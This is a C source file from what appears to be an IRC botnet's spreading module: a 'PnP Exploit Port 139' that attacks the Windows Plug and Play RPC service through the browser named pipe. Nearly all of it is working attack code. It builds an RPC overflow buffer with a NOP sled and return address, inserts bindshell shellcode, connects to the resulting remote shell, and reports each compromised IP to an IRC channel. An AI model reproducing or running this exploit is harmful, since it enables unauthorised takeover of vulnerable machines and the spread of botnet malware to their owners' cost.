/***********************************
*DFNCDFNCDFNCDFNCDFNCDFNCDFNCDFNCDF*
*PnP Exploit Port 139 PRIVATE v.0.1*
*DFNCDFNCDFNCDFNCDFNCDFNCDFNCDFNCDF*
***********************************/

#ifndef NO_PNP

#include "includes.h"
#include "functions.h"

#pragma comment(lib, "mpr")
#pragma comment(lib, "Rpcrt4")

BYTE Data1[0x68] = {
	0x11,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x11,0x00,0x00,0x00,
	0x52,0x00,0x4F,0x00,0x4F,0x00,0x54,0x00,0x5C,0x00,0x53,0x00,
	0x59,0x00,0x53,0x00,0x54,0x00,0x45,0x00,0x4D,0x00,0x5C,0x00,
	0x30,0x00,0x30,0x00,0x30,0x00,0x30,0x00,0x00,0x00,0x00,0x00,
	0xFF,0xFF,0x00,0x00,0x21,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0xEE,0xEE,0xEE,0xEE,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x21,0x00,0x00,0x00,
	0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00
};

struct DataStruct1
{
	BYTE SomeString[0x30];
	DWORD RESDataType;
	DWORD LFD;
	DWORD SDM1;
	DWORD SDO;
	DWORD SDL;
	DWORD SDM2;
	BYTE SDA[0x07D0];
	DWORD LRD;
	DWORD MB;
	DWORD DM;
};
struct RPCBIND
{
	BYTE VerMaj;
	BYTE VerMin;
	BYTE PacketType;
	BYTE PacketFlags;
	DWORD DataRep;
	WORD FragLength;
	WORD AuthLength;
	DWORD CallID;
	WORD MaxXmitFrag;
	WORD MaxRecvFrag;
	DWORD AssocGroup;
	BYTE NumCtxItems;
	WORD ContextID;
	WORD NumTransItems;
	GUID InterfaceUUID;
	WORD InterfaceVerMaj;
	WORD InterfaceVerMin;
	GUID TransferSyntax;
	DWORD SyntaxVer;
};

BYTE PRPC[0x48] ={
	0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x01,0x00,0x00,0x00,
	0xB8,0x10,0xB8,0x10,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x00,
	0x6A,0x28,0x19,0x39,0x0C,0xB1,0xD0,0x11,0x9B,0xA8,0x00,0xC0,0x4F,0xD9,0x2E,0xF5,
	0x00,0x00,0x00,0x00,0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,
	0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00
};

struct RPCFUNC
{
	BYTE VerMaj;
	BYTE VerMin;
	BYTE PacketType;
	BYTE PacketFlags;
	DWORD DataRep;
	WORD FragLength;
	WORD AuthLength;
	DWORD CallID;
	DWORD AllocHint;
	WORD ContextID;
	WORD Opnum;
};

BYTE POP[0x27] ={
	0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0xAC,0x10,0x00,0x00,0x01,0x00,0x00,0x00,
	0x94,0x10,0x00,0x00,0x00,0x00,0x09,0x00,0x05,0x08,0x00,0x00,0x00,0x00,0x00,0x00,
	0x05,0x08,0x00,0x00,0x41,0x00,0x41
};

BYTE CTRLC = 0x03;

int BindRpcInterface(HANDLE PH, char *Interface, char *InterfaceVer) {
	BYTE rbuf[0x1000];
	DWORD dw;
	struct RPCBIND RPCBind;

	memcpy(&RPCBind,&PRPC,sizeof(RPCBind));
	UuidFromString((unsigned char *)Interface,&RPCBind.InterfaceUUID);
	UuidToString(&RPCBind.InterfaceUUID,(unsigned char **)&Interface);
	RPCBind.InterfaceVerMaj=atoi(&InterfaceVer[0]);
	RPCBind.InterfaceVerMin=atoi(&InterfaceVer[2]);
	TransactNamedPipe(PH, &RPCBind, sizeof(RPCBind), rbuf,sizeof(rbuf), &dw, NULL);
	return 0;
}

/*int Attack(HANDLE PipeHandle)
{
	struct RPCFUNC RPCOP;
	int bwritten=0;
	BYTE *LargeBuffer;
	BYTE rbuf[0x100];
	DWORD dw;
	struct DataStruct1 EvilRPC;

	memcpy(&EvilRPC,&Data1,sizeof(EvilRPC));
	EvilRPC.SDL=0x07C0;
	memset(EvilRPC.SDA,0x90,0x07D0);
	EvilRPC.SDA[76]=0x3e;
	RPCOP.Opnum = 54;
	RPCOP.FragLength=sizeof(RPCOP)+sizeof(EvilRPC);
	RPCOP.AllocHint=sizeof(EvilRPC);
	LargeBuffer=(unsigned char *)malloc(sizeof(RPCOP)+sizeof(EvilRPC));
	memset(LargeBuffer,0x00,sizeof(RPCOP)+sizeof(EvilRPC));
	memcpy(LargeBuffer,&RPCOP,sizeof(RPCOP));
	memcpy(LargeBuffer+sizeof(RPCOP),&EvilRPC,sizeof(EvilRPC));
	TransactNamedPipe(PipeHandle, LargeBuffer,sizeof(RPCOP)+sizeof(EvilRPC), rbuf, sizeof(rbuf), &dw, NULL);
	free(LargeBuffer);
	return 0;
}*/

int Attack(HANDLE PipeHandle)
{
	struct RPCFUNC RPCOP;
	int bwritten=0;
	BYTE *LargeBuffer;
	BYTE rbuf[0x100];
	DWORD dw;
	struct DataStruct1 EvilRPC;
	int pnpbindsize=405;

	memcpy(&EvilRPC,&Data1,sizeof(EvilRPC));
	EvilRPC.SDL=0x07C0;
	memset(EvilRPC.SDA,0x90,0x07D0);
	EvilRPC.SDA[76]=0x3e;
	EvilRPC.SDA[77]=0x1e;
	EvilRPC.SDA[78]=0x02;
	EvilRPC.SDA[79]=0x75;
	memset(EvilRPC.SDA+80,0x90,10);
	EvilRPC.SDA[90]=0x90;
	memcpy(EvilRPC.SDA+94,bindshell,pnpbindsize-1);
	EvilRPC.MB=0x00000004;
	EvilRPC.DM=0x00000000;
	EvilRPC.LFD=0x000007E0;
	EvilRPC.LRD=0x000007E0;
	memcpy(&RPCOP,&POP,sizeof(RPCOP));
	RPCOP.Opnum = 54;
	RPCOP.FragLength=sizeof(RPCOP)+sizeof(EvilRPC);
	RPCOP.AllocHint=sizeof(EvilRPC);
	LargeBuffer=(unsigned char*)malloc(sizeof(RPCOP)+sizeof(EvilRPC));
	memset(LargeBuffer,0x00,sizeof(RPCOP)+sizeof(EvilRPC));
	memcpy(LargeBuffer,&RPCOP,sizeof(RPCOP));
	memcpy(LargeBuffer+sizeof(RPCOP),&EvilRPC,sizeof(EvilRPC));
	TransactNamedPipe(PipeHandle, LargeBuffer, sizeof(RPCOP)+sizeof(EvilRPC), rbuf, sizeof(rbuf), &dw, NULL);
	free(LargeBuffer);
	return 0;
}

BOOL PnP139(char *target, void* conn,EXINFO exinfo)
{
	IRC* irc=(IRC*)conn;
    NETRESOURCE nr;
    char unc[MAX_PATH];
    char szPipe[MAX_PATH];
    HANDLE hFile;
	int cSock;

	if ((cSock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) return FALSE;

/*	int TargetOS = FpHost(exinfo.ip, FP_RPC);

	if (TargetOS == OS_WINXP) return FALSE;*/

    _snprintf(unc, sizeof(unc), "\\\\%s\\pipe", exinfo.ip);
    unc[sizeof(unc)-1] = 0;
    nr.dwType = RESOURCETYPE_ANY;
    nr.lpLocalName = NULL;
    nr.lpRemoteName = unc;
    nr.lpProvider = NULL;
    WNetAddConnection2(&nr, "", "", 0);

    _snprintf(szPipe, sizeof(szPipe),"\\\\%s\\pipe\\browser",exinfo.ip);
    hFile = CreateFile(szPipe, GENERIC_READ|GENERIC_WRITE, 0, NULL,OPEN_EXISTING, 0, NULL);

    BindRpcInterface(hFile,"8d9f4e40-a03d-11ce-8f69-08003e30051b","1.0");

    Attack(hFile);

//	if(success){
		Sleep(5000);
		if (fsend(cSock, (const char *)CTRLC, sizeof(CTRLC)-1, 0))return FALSE;

		if (ConnectShell(exinfo,bindport))
		{
			if (!exinfo.silent)
				irc->privmsg(target,"%s %s: Exploiting IP: %s.", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
			exploit[exinfo.exploit].stats++;
		}
		else
			if (!exinfo.silent && exinfo.verbose)
				irc->privmsg(target,"%s %s: Failed to exploit IP: %s.", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
//	}
	return TRUE;
}
#endif